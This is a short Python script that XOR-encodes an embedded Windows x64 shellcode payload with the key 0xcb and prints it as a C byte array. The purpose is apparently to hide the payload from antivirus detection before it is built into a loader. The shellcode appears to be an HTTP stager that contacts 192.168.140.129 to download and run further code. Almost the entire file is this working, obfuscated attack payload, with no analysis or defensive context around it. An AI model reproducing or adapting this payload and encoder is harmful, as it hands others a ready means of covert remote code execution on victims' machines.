def XorEncrypt(shellcode):
    key = 0xcb
    encrypt_shellcode = ''.join([chr(ord(char)^key)for char in shellcode])
    return encrypt_shellcode

shellcode = "\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x75\x72\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x4f\xff\xff\xff\x5d\x6a\x00\x49\xbe\x77\x69\x6e\x69\x6e\x65\x74\x00\x41\x56\x49\x89\xe6\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x48\x31\xc9\x48\x31\xd2\x4d\x31\xc0\x4d\x31\xc9\x41\x50\x41\x50\x41\xba\x3a\x56\x79\xa7\xff\xd5\xeb\x73\x5a\x48\x89\xc1\x41\xb8\x50\x00\x00\x00\x4d\x31\xc9\x41\x51\x41\x51\x6a\x03\x41\x51\x41\xba\x57\x89\x9f\xc6\xff\xd5\xeb\x59\x5b\x48\x89\xc1\x48\x31\xd2\x49\x89\xd8\x4d\x31\xc9\x52\x68\x00\x02\x40\x84\x52\x52\x41\xba\xeb\x55\x2e\x3b\xff\xd5\x48\x89\xc6\x48\x83\xc3\x50\x6a\x0a\x5f\x48\x89\xf1\x48\x89\xda\x49\xc7\xc0\xff\xff\xff\xff\x4d\x31\xc9\x52\x52\x41\xba\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x85\x9d\x01\x00\x00\x48\xff\xcf\x0f\x84\x8c\x01\x00\x00\xeb\xd3\xe9\xe4\x01\x00\x00\xe8\xa2\xff\xff\xff\x2f\x62\x32\x58\x71\x00\x1d\x45\x4c\x5b\xac\x15\x42\x41\xb6\x36\xe5\xc2\xf4\xfa\x4e\xd3\xc5\x75\x71\xf0\x93\xc1\x43\x7b\xac\xa1\x27\x8a\xf4\x9f\x7b\xd4\xfa\x48\x85\xe0\xa5\x63\xb7\xb1\x22\x96\xdd\x06\xda\xe3\x13\xc0\x10\xdf\x58\x08\x6b\xc5\x61\x0e\x00\xad\x47\x4b\x72\x20\x07\x4e\x8c\x06\x5f\xc5\xc6\xab\x5c\x5f\x8c\x00\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x63\x6f\x6d\x70\x61\x74\x69\x62\x6c\x65\x3b\x20\x4d\x53\x49\x45\x20\x39\x2e\x30\x3b\x20\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x36\x2e\x31\x3b\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x35\x2e\x30\x3b\x20\x4d\x41\x4c\x43\x29\x0d\x0a\x00\x7e\x87\x2f\xf7\x40\xab\x0d\x75\xf9\x29\x5d\x9a\x51\x3f\x89\x22\xcf\xaf\x11\xa7\x00\xd0\x17\x48\x20\x45\x8b\x37\xd7\x80\x6e\xb0\x8a\x30\x74\x63\x44\xa9\x5a\x96\x07\x3e\x28\x13\x44\x21\x81\x62\x0d\x44\xee\x1e\xa9\xa3\x54\xe3\x1a\xe5\x32\x36\x27\x8b\x79\x9b\x0f\x63\xb9\xea\x58\xbf\x22\x73\x36\xe8\x7e\xa5\xc7\x6f\x26\x31\x70\x71\x8a\xd0\x1e\x21\xed\xc2\x91\xd4\x80\xc7\xc5\xec\xb3\x46\xea\xd2\xb1\xef\xc2\xd0\xc0\xcb\x83\xfc\x82\x9b\xd9\x13\x70\x37\x82\xe9\x92\x9d\xec\xd5\xcd\x0d\xa4\x35\x71\x11\x10\x2c\x4e\xa7\x04\x9e\x28\x7c\xee\x74\xea\xe1\x7b\x38\x66\x02\xf1\x66\x4c\x25\x1a\x2c\x62\xf1\x8c\x79\xa3\xd5\x04\xd6\xf3\xd9\x27\x9f\x5f\xe5\xfa\x25\xca\xd6\x50\x18\xb8\x48\x7b\xab\x0d\x27\x58\x2b\xaa\xa9\x17\x1e\x8b\xde\xc6\x93\x54\xc2\x7e\x8f\xce\xef\x92\x08\xe2\x10\xf0\xb5\x7a\x71\x6b\x6e\x02\xa5\xa1\x5c\x49\xb9\x2e\xa7\x82\x3c\xcc\x2c\x85\x26\x69\x92\x5a\x41\x58\x78\x46\x00\x41\xbe\xf0\xb5\xa2\x56\xff\xd5\x48\x31\xc9\xba\x00\x00\x40\x00\x41\xb8\x00\x10\x00\x00\x41\xb9\x40\x00\x00\x00\x41\xba\x58\xa4\x53\xe5\xff\xd5\x48\x93\x53\x53\x48\x89\xe7\x48\x89\xf1\x48\x89\xda\x41\xb8\x00\x20\x00\x00\x49\x89\xf9\x41\xba\x12\x96\x89\xe2\xff\xd5\x48\x83\xc4\x20\x85\xc0\x74\xb6\x66\x8b\x07\x48\x01\xc3\x85\xc0\x75\xd7\x58\x58\x58\x48\x05\x00\x00\x00\x00\x50\xc3\xe8\x9f\xfd\xff\xff\x31\x39\x32\x2e\x31\x36\x38\x2e\x31\x34\x30\x2e\x31\x32\x39\x00\x27\xbc\x86\xaa";

encrypt_shellcode = XorEncrypt(shellcode)

print("unsigned char shellcode[] = \"",''.join(f'\\x{ord(char):02x}'for char in encrypt_shellcode),"\"")